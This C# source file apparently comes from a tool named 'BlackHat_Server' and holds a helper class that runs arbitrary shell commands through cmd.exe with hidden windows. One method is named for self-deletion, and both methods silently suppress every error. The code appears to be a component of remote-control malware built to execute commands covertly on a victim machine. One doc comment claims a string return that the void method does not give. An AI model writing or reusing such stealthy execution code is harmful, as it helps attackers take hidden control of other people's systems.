using System.Diagnostics;

namespace BlackHat_Server
{
    internal class DosRunner
    {
        /// <summary>
        ///     Esegue un comando da dos
        /// </summary>
        /// <param name="dosCMD"></param>
        public void RunDosSelfDelete(string dosCMD)
        {
            try
            {
                if (!string.IsNullOrEmpty(dosCMD))
                {
                    var Info = new ProcessStartInfo();

                    Info.Arguments = dosCMD;

                    Info.WindowStyle = ProcessWindowStyle.Hidden;
                    Info.CreateNoWindow = true;
                    Info.FileName = "cmd.exe";
                    Process.Start(Info);
                }
            }
            catch
            {
            }
        }
        //-------------------------------------

        /// <summary>
        ///     Executes a shell command synchronously.
        /// </summary>
        /// <param name="command">string command</param>
        /// <returns>string, as output of the command.</returns>
        public void ExecuteCommand(string command)
        {
            try
            {
                var procStartInfo =
                    new ProcessStartInfo("cmd", "/c " + command);


                procStartInfo.RedirectStandardOutput = true;
                procStartInfo.UseShellExecute = false;

                procStartInfo.CreateNoWindow = true;

                var proc = new Process();
                proc.StartInfo = procStartInfo;
                proc.Start();

                var result = proc.StandardOutput.ReadToEnd();
            }
            catch
            {
            }
        }
        //--------------------------------------
    }
}